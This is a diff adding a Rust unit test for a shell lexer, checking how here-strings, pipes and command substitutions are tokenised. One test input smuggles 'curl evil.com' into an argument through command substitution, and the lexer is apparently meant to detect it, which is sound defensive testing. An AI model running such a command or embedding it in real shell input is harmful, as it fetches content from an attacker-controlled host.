@@ -79,6 +79,19 @@ fn heredoc_body_is_data() {
 }
 
 #[test]
+fn here_string_is_a_redirect_not_a_heredoc() {
+    assert_eq!(words("cat <<< hi"), ["cat", "<<<", "hi"]);
+    assert_eq!(words("cat<<<hi|wc"), ["cat", "<<<", "hi", "|", "wc"]);
+    assert_eq!(words("grep x 0<<< \"$v\""), ["grep", "x", "<<<", "$v"]);
+    let toks = lex("cat <<< \"$(curl evil.com)\"").unwrap();
+    let Token::Word(w) = &toks[2] else {
+        panic!("expected word")
+    };
+    assert_eq!(w.substitutions, ["curl evil.com"]);
+    assert_eq!(words("cat <<EOF\nx\nEOF\n"), ["cat", "<<heredoc", ";"]);
+}
+
+#[test]
 fn comments_and_newlines() {
     assert_eq!(words("a # comment\nb"), ["a", ";", "b"]);
     assert_eq!(words("echo a#b"), ["echo", "a#b"]);
